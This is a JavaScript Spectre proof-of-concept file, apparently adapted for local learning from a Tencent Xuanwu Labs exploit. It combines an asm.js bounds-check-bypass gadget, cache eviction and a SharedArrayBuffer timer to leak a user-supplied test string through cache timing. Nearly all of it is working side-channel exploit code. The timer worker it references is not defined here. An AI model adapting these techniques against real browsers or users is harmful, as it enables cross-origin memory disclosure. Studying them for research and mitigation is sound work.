/*
* spectre.js - Spectre Javascript Experiment
*
* Credit to Tencent Xuanwu Labs for original PoC
*
* Modified to make it easier to run locally, and to provide options for the user to tweak
* and play with to learn about what parameters affect the exploit
*
*/

function log(msg)
{
    var p = document.getElementById("progress");
    if (p)
    {
        p.innerText += msg + "\n";
    }
    else
    {
        console.log(msg);
    }
}
function asmModule(stdlib,forgein,heap)
{
    'use asm'
    var simpleByteArray = new stdlib.Uint8Array(heap);
    var probeTable = new stdlib.Uint8Array(heap);
    var TABLE1_STRIDE = 0x1000;
    var TABLE1_BYTES = 0x2000000;
    var junk = 0;
    var simpleByteArrayLength = 16;
    var sizeArrayStart = 0x1000000;

    function init()
    {
        var i =0;
        var j =0;
        for(i=0; (i|0)<16; i=(i+1)|0 )
            simpleByteArray[i|0] = ((i|0)+1)|0;
        for(i=0; (i|0)<30; i=(i+1)|0 )
        {
            j = ((((i|0)*8192)|0) +  0x1000000)|0
            simpleByteArray[(j|0)] = 0x10;
        }
    }

    function vul_call(index, sIndex)
    {
        index = index |0;
        sIndex = sIndex |0;        
        var arr_size = 0;
        var j = 0;
        junk = probeTable[0]|0;
        j = ((((sIndex|0)*8192)|0) +  0x1000000)|0;
        arr_size = simpleByteArray[(j|0)]|0;
        if ((index|0) < (arr_size|0))
        {
            index = simpleByteArray[index|0]|0;
            index = ((index * 0x1000)|0);
            junk = (junk ^ (probeTable[index]|0))|0;
        }
    }
    
    function flush()
    {
        var i =0;
        var current = 0;
        for (i = 256; (i|0) < 16640; i=(i+1)|0 )
            current = probeTable[((i|0) * 512)|0]|0;
    }
    return { vul_call: vul_call ,init: init, flush:flush}
}



function check(num, hit, data_array)
{
    function now() { return Atomics.load(sharedArray, 0) }
    function reset() { Atomics.store(sharedArray, 0, 0) }
    function start() { reset(); return now(); }
    function clflush(size)
    {
        for (var i = 0; i < ((size) / offset); i++)
            current = evictionView.getUint32(i * offset);
    }

    const worker = new Worker(URL.createObjectURL(new Blob(["(" + worker_thread.toString() + ")()"], {type: 'text/javascript'})));

    const sharedBuffer = new SharedArrayBuffer(10 * Uint32Array.BYTES_PER_ELEMENT);
    const sharedArray = new Uint32Array(sharedBuffer);
    worker.postMessage(sharedBuffer);

    var simpleByteArrayLength =  16;
    var TABLE1_STRIDE = 0x1000;
    var TABLE1_BYTES = 0x3000000;
    var CACHE_HIT_THRESHOLD = hit;
    var probeTable = new Uint8Array(TABLE1_BYTES);

    var offset = 64;
    var current;
    var cache_size = num * 1024 * 1024;
    var evictionBuffer = new ArrayBuffer(cache_size);
    var evictionView = new DataView(evictionBuffer);
    clflush(cache_size);

    var asm = asmModule(this,{},probeTable.buffer)
    var cnt =0;

    worker.onmessage = function(msg)
    {
        function readMemoryByte(malicious_x)
        {
            var results = new Uint32Array(257);
            var simpleByteArray = new Uint8Array(probeTable.buffer);
            var tries =0
            var junk = 0;
            var j = -1;
            var k = -1;
            for (tries = 99; tries > 0; tries--)
            {
                var training_x = tries % simpleByteArrayLength;
                clflush(cache_size);
                var time3 = start();  
                junk = simpleByteArray[0];
                var time4 = now();  

                for (var j = 29; j >= 0; j--)
                { 
                    for ( var z = 0; z < 100; z++) {}
                    var x = ((j % 6) - 1) & ~0xFFFF; 
                    x = (x | (x >> 16)); 
                    x = training_x ^ (x & (malicious_x ^ training_x));
                    asm.vul_call(x,j);
                }
                
                for (var i = 0; i < 256; i++)
                {
                    var mix_i = i;
                    var timeS = start();
                    junk =  probeTable[(mix_i * TABLE1_STRIDE)];
                    timeE = now();
                    if (timeE-timeS <= CACHE_HIT_THRESHOLD && mix_i != simpleByteArray[tries % simpleByteArrayLength])
                        results[mix_i]++;
                }
                
                for (var i = 0; i<256; i++)
                {
                    if (j<0 || results[i] >= results[j])
                    {
                        k = j;
                        j = i;
                    }
                    else if (k < 0 || results[i] >= results[k])
                        k = i;
                }
                if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
                    break;
            }
        
            results[256] ^= junk;
            return [j,k,results[j],results[k]]
        }
        
        function readMemoryByteWrapper(malicious_x)
        {
            var rlt = readMemoryByte(malicious_x);

            if(rlt[0] != 0)
            {
                return rlt[0]
            }
            else
            {
                clflush(cache_size);
                var com_rlt = readMemoryByte(malicious_x);
                if (com_rlt[1] == rlt[1] || com_rlt[0] == rlt[1])
                    return rlt[1]
                else if (com_rlt[0] == 0 || com_rlt[1] == 0)
                    return com_rlt[0]
                else
                {
                    return -1;
                }
            }
        }

        asm.init();
        for(var i=0 ;i<0x1000;i++)
        {
            asm.vul_call(1,0);
            clflush(64);
        }

        var simpleByteArray = new Uint8Array(probeTable.buffer);
        for(var i=0;i<data_array.length;i++)
            simpleByteArray[0x2200000 + i] = data_array[i];
  
        for(var i=0;i<data_array.length;i++)
        {
            var data = readMemoryByteWrapper(0x2200000+i);
            worker.terminate();
            log("Leak offset = 0x" + (0x2200000+i).toString(16) + " Expecting: " + String.fromCharCode(data_array[i]) +
                ", Got: byte value =0x" + data.toString(16) + " '" + String.fromCharCode(data) + "'" +
                ((data != data_array[i]) ? " (error)" : ""));

        }

        worker.terminate();
        return;
    }
}

function main()
{
    if(window.SharedArrayBuffer)
    {
        // Get selected cache size
        let cacheSize = document.getElementById('cache-size').value;
        // Get hit ratio
        let hitRatio = document.getElementById('hit-ratio').value;
        // Parse Input string
        let inputString = document.getElementById('test-string').value;
        let byteArray = [inputString.length];
        if(inputString.length >0){
            for(let i=0; i< inputString.length; i++) byteArray[i] = inputString.charCodeAt(i);
            log("Trying string: " + inputString + " with cache size of " + cacheSize + " MB and hit-ratio of: " + hitRatio + "%");
            check(cacheSize, hitRatio, byteArray);
        }
    }
}
function clearOutput() {
    // Clear progress output
    document.getElementById('progress').innerText = "";
}
if(window.SharedArrayBuffer){
    let banner = document.getElementById("banner");
    banner.innerHTML = "<div style='color:greenyellow'><h1>SharedArrayBuffer is available!</h1></div>"
}
else{
    let banner = document.getElementById("banner");
    banner.innerHTML = "<div style='color:red'><h1>SharedArrayBuffer is not available!</h1></div>"
}

//main();
